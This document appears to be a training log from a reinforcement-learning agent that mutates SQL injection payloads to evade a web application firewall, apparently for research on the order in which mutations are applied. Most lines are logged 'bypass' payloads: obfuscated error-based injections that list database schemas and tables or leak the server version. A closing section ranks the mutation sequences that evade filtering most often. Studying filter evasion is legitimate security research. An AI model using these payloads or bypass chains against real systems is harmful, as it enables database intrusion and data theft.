+  [BYPASS] Ep 9846 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SELEct%0d%0a*%0d%0aFRom%0d%0a(sELeCt%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(CONCAT(tAbLE_schema,CHAR(46),tABLe_name))%0d%0afRom%0d%0a
+  Ep 9850 | SR=10% | Steps=14.0 | R=-30.42
+  [BYPASS] Ep 9858 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SELeCT%0d%0a*%0d%0afrOM%0d%0a(selECT%0d%0a((SELEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aINfoRMAtioN_SCHEMa.schemata))
+  Ep 9860 | SR=10% | Steps=13.9 | R=-31.54
+  [BYPASS] Ep 9865 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(SelEct%0d%0a*%0d%0aFrOm%0d%0a(seLecT%0d%0a((SeLEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aiNfORmaTION_SchemA.schemata))
+  Ep 9870 | SR=10% | Steps=13.9 | R=-29.12
+  [BYPASS] Ep 9879 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SElECt%0d%0a*%0d%0aFRoM%0d%0a(SelECT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOm%0d%0aINformAtioN_scHema.schemata))
+  Ep 9880 | SR=10% | Steps=13.9 | R=-31.34
+  Ep 9890 | SR=0% | Steps=15.0 | R=-32.24
+  [BYPASS] Ep 9895 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SelEcT%0d%0a*%0d%0aFROm%0d%0a(SeleCT%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(coNCAt(TaBle_schema,CHAR(46),tAble_name))%0d%0afrom%0d%0a
+  [BYPASS] Ep 9900 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(selEcT%0d%0a*%0d%0aFroM%0d%0a(sElect%0d%0a((sElect%0d%0aJSON_ARRAYAGG(cONCat(TAblE_schema,CHAR(46),tABLe_name))%0d%0afRoM%0d%0a
+  Ep 9900 | SR=20% | Steps=13.0 | R=-26.61
+  Ep 9910 | SR=0% | Steps=15.0 | R=-35.71
+  [BYPASS] Ep 9917 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SELEct%0d%0a*%0d%0aFRom%0d%0a(sEleCT%0d%0a((SeLeCt%0d%0aJSON_ARRAYAGG(COnCAt(TaBlE_schema,CHAR(46),TaBle_name))%0d%0aFROm%0d%0a
+  Ep 9920 | SR=10% | Steps=14.0 | R=-29.69
+  Ep 9930 | SR=0% | Steps=15.0 | R=-34.24
+  [BYPASS] Ep 9935 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(seLEcT%0d%0a*%0d%0afROm%0d%0a(SEleCt%0d%0a((seleCT%0d%0aJSON_ARRAYAGG(CoNCAT(TAblE_schema,CHAR(46),TablE_name))%0d%0afrOm%0d%0a
+  Ep 9940 | SR=10% | Steps=14.0 | R=-31.12
+  Ep 9950 | SR=0% | Steps=15.0 | R=-35.03
+  Ep 9960 | SR=0% | Steps=15.0 | R=-35.12
+  [BYPASS] Ep 9968 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SeLect%0d%0a*%0d%0afRom%0d%0a(sELect%0d%0a((SELeCt%0d%0aJSON_ARRAYAGG(conCAt(TABle_schema,CHAR(46),tAblE_name))%0d%0afrOM%0d%0a
+  [BYPASS] Ep 9969 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SEleCt%0d%0a*%0d%0aFRoM%0d%0a(sELeCT%0d%0a((seleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aINFoRmaTiOn_SCHemA.schemata))
+  Ep 9970 | SR=20% | Steps=12.9 | R=-26.93
+  Ep 9980 | SR=0% | Steps=15.0 | R=-32.85
+  Ep 9990 | SR=0% | Steps=15.0 | R=-34.66
+  [BYPASS] Ep 9996 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SelEct%0d%0a*%0d%0aFroM%0d%0a(seLect%0d%0a((sElECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0ainfOrMatioN_SChEMA.schemata))
+  Ep 10000 | SR=10% | Steps=13.9 | R=-29.55
+  Ep 10010 | SR=0% | Steps=15.0 | R=-33.09
+  [BYPASS] Ep 10014 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(sELEcT%0d%0a*%0d%0aFROm%0d%0a(seLEct%0d%0a((seLEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0aInforMAtIoN_sChema.schemata))
+  Ep 10020 | SR=10% | Steps=13.9 | R=-30.93
+  Ep 10030 | SR=0% | Steps=15.0 | R=-33.30
+  [BYPASS] Ep 10034 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(selecT%0d%0a*%0d%0afroM%0d%0a(SelecT%0d%0a((SelECT%0d%0aJSON_ARRAYAGG(CONcAt(TaBLe_schema,CHAR(46),TaBle_name))%0d%0aFrOM%0d%0a
+  Ep 10040 | SR=10% | Steps=14.0 | R=-31.94
+  Ep 10050 | SR=0% | Steps=15.0 | R=-34.51
+  Ep 10060 | SR=0% | Steps=15.0 | R=-31.27
+  [BYPASS] Ep 10063 | steps=6 | seq=agg_swap -> hex_to_char -> null_byte -> crlf -> func_sp_nl -> case
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sElect%0d%0a*%0d%0aFrOm%0d%0a(seleCT%0d%0a((SelEcT%0d%0aJSON_ARRAYAGG(cONcat(tabLe_schema,CHAR(46),tablE_name))%0d%0aFrOm%0d%0a
+  Ep 10070 | SR=10% | Steps=14.1 | R=-31.01
+  Ep 10080 | SR=0% | Steps=15.0 | R=-33.35
+  Ep 10090 | SR=0% | Steps=15.0 | R=-33.64
+  [BYPASS] Ep 10099 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SeLECT%0d%0a*%0d%0aFrOM%0d%0a(SElEct%0d%0a((SelEct%0d%0aJSON_ARRAYAGG(ConcAT(tabLE_schema,CHAR(46),TaBlE_name))%0d%0afrOM%0d%0a
+  Ep 10100 | SR=10% | Steps=14.0 | R=-31.71
+  Ep 10110 | SR=0% | Steps=15.0 | R=-35.75
+  [BYPASS] Ep 10114 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SeLect%0d%0a*%0d%0aFROM%0d%0a(SelecT%0d%0a((sELect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aInfOrMatiON_scHEma.schemata))
+  [BYPASS] Ep 10119 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(selECT%0d%0a*%0d%0aFrOM%0d%0a(SelEcT%0d%0a((selECt%0d%0aJSON_ARRAYAGG(CONCAT(tAbLE_schema,CHAR(46),TablE_name))%0d%0afROM%0d%0a
+  Ep 10120 | SR=20% | Steps=12.9 | R=-26.87
+  [BYPASS] Ep 10127 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SELecT%0d%0a*%0d%0aFrOM%0d%0a(sEleCT%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROM%0d%0aInFoRMAtION_SChEma.schemata))
+  Ep 10130 | SR=10% | Steps=13.9 | R=-31.04
+  Ep 10140 | SR=0% | Steps=15.0 | R=-32.07
+  [BYPASS] Ep 10143 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SelEcT%0d%0a*%0d%0aFROM%0d%0a(SElect%0d%0a((SELeCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0aiNfORMatIon_schemA.schemata))
+  [BYPASS] Ep 10147 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(SEleCT%0d%0a*%0d%0afrom%0d%0a(sElECt%0d%0a((seLeCT%0d%0aJSON_ARRAYAGG(ConCAT(taBLe_schema,CHAR(46),tABLe_name))%0d%0aFrOM%0d%0a
+  Ep 10150 | SR=20% | Steps=12.9 | R=-26.06
+  Ep 10160 | SR=0% | Steps=15.0 | R=-34.65
+  Ep 10170 | SR=0% | Steps=15.0 | R=-34.60
+  Ep 10180 | SR=0% | Steps=15.0 | R=-33.61
+  [BYPASS] Ep 10183 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SEleCT%0d%0a*%0d%0aFRoM%0d%0a(SeLeCT%0d%0a((SeLeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afroM%0d%0aiNfoRMATIon_scheMA.schemata))
+  Ep 10190 | SR=10% | Steps=13.9 | R=-30.75
+[*] A2C model saved: models/a2c_error_seed1.zip
+
+============================================================
+ TRAINING RESULTS
+============================================================
+  Total episodes     : 10196
+  Successful bypass  : 340 (3.3%)
+  Avg steps (success): 6.35
+
+  Top mutations:
+    case                   : 799
+    null_byte              : 372
+    agg_swap               : 340
+    crlf                   : 327
+    hex_to_char            : 173
+
+  Shortest bypass:
+    Steps    : 4
+    Sequence : case -> func_sp_nbsp -> crlf -> null_byte
+    Payload  : 1'%0d%0aaNd%0d%0aGTID_SUBSET((version%a0()),1);%00
+[*] A2C logs saved to results_a2c_less1.0.json
+
+============================================================
+ RQ3 — MUTATION ORDERING ANALYSIS
+============================================================
+
+  [1] First-Step Success Rate (which mutation to apply FIRST?)
+  Action                 |     SR |  Succ / Total
+  --------------------------------------------------
+  func_sp_nbsp           |   8.8% |     3 /    34  
+  agg_swap               |   7.0% |   228 /  3243  
+  dot_prefix             |   5.1% |     2 /    39  
+  gbk_bypass             |   4.3% |     3 /    69  
+  ver_12345              |   4.3% |     1 /    23  
+  paren_full             |   4.2% |     1 /    24  
+  func_sp_ff             |   2.9% |     1 /    35  
+  case_split             |   2.5% |     1 /    40  
+  formfeed               |   2.4% |     1 /    41  
+  case                   |   2.3% |    61 /  2650  
+
+  [2] Top Bigram Sequences (A -> B success rate)
+  Sequence                            |     SR | Count
+  -------------------------------------------------------
+  url_encode -> ver_newline           |  33.3% |     3  ███
+  double_and -> nested_union          |  25.0% |     4  ██
+  plus_sep -> url_encode              |  25.0% |     4  ██
+  hash_nl -> formfeed                 |  25.0% |     4  ██
+  func_sp_lit -> hash_nl              |  25.0% |     4  ██
+  func_sp_nbsp -> ident_backtick      |  25.0% |     4  ██
+  comment -> distinct                 |  20.0% |     5  ██
+  hex_to_char -> double_or            |  20.0% |     5  ██
+  crlf -> convert_charset             |  20.0% |     5  ██
+  distinct -> url_mid_char            |  20.0% |     5  ██
+
+  [3] Ordering Effect: A->B  vs  B->A
+  Forward                       SR  |  Reversed                      SR  |   Diff | Matters?
+  --------------------------------------------------------------------------------
+  url_encode -> ver_newline  33.3%  |    ver_newline -> url_encode   0.0%  |  +33.3% | ✓ YES
+  plus_sep -> url_encode     25.0%  |    url_encode -> plus_sep      0.0%  |  +25.0% | ✓ YES
+  hash_nl -> formfeed        25.0%  |    formfeed -> hash_nl         0.0%  |  +25.0% | ✓ YES
+  func_sp_lit -> hash_nl     25.0%  |    hash_nl -> func_sp_lit      0.0%  |  +25.0% | ✓ YES
+  func_sp_nbsp -> ident_backtick  25.0%  |    ident_backtick -> func_sp_nbsp   0.0%  |  +25.0% | ✓ YES
+  comment -> distinct        20.0%  |    distinct -> comment         0.0%  |  +20.0% | ✓ YES
+  hex_to_char -> double_or   20.0%  |    double_or -> hex_to_char    0.0%  |  +20.0% | ✓ YES
+  crlf -> convert_charset    20.0%  |    convert_charset -> crlf     0.0%  |  +20.0% | ✓ YES
+  distinct -> url_mid_char   20.0%  |    url_mid_char -> distinct    0.0%  |  +20.0% | ✓ YES
+  hex_to_char -> func_sp_lit  20.0%  |    func_sp_lit -> hex_to_char   0.0%  |  +20.0% | ✓ YES
+
+  [4] Position Sensitivity (does position in sequence matter?)
+  Action                 |    pos_1 |    pos_2 |   pos_3+ |  Δ(1 vs 2)
+  ----------------------------------------------------------------------
+  double_and             |     0.0% |     0.0% |     0.3% |      +0.0%
+  hash_nl                |     0.0% |     0.0% |     1.2% |      +0.0%
+  agg_swap               |     7.0% |     5.1% |     2.0% |      +1.9%
+  url_encode             |     0.0% |     0.0% |     0.6% |      +0.0%
+  func_sp_lit            |     0.0% |     0.0% |     0.5% |      +0.0%
+  hex_to_char            |     0.2% |     2.9% |     2.8% |      -2.7%
+  case_split             |     2.5% |     0.0% |     0.6% |      +2.5%
+  nested_or              |     0.0% |     0.0% |     0.0% |      +0.0%
+  func_sp_tab            |     0.0% |     0.0% |     0.8% |      +0.0%
+  func_swap_err          |     0.0% |     0.0% |     0.4% |      +0.0%
+  func_sp_nl             |     0.0% |     0.0% |     0.2% |      +0.0%
+  concat_char            |     0.0% |     0.0% |     0.9% |      +0.0%
+
+  VERDICT:
+  Ordering matters (≥10% SR gap) in 22 out of 1059 observed pairs.
+  Key pairs where order is critical:
+    url_encode -> ver_newline      SR=33.3%  vs  ver_newline -> url_encode      SR=0.0%
+    plus_sep -> url_encode         SR=25.0%  vs  url_encode -> plus_sep         SR=0.0%
+    hash_nl -> formfeed            SR=25.0%  vs  formfeed -> hash_nl            SR=0.0%
+    func_sp_lit -> hash_nl         SR=25.0%  vs  hash_nl -> func_sp_lit         SR=0.0%
+    func_sp_nbsp -> ident_backtick SR=25.0%  vs  ident_backtick -> func_sp_nbsp SR=0.0%
+
+[*] Ordering analysis saved to: ordering_a2c_less1.0.json
+
+[*] Total HTTP requests: 124963
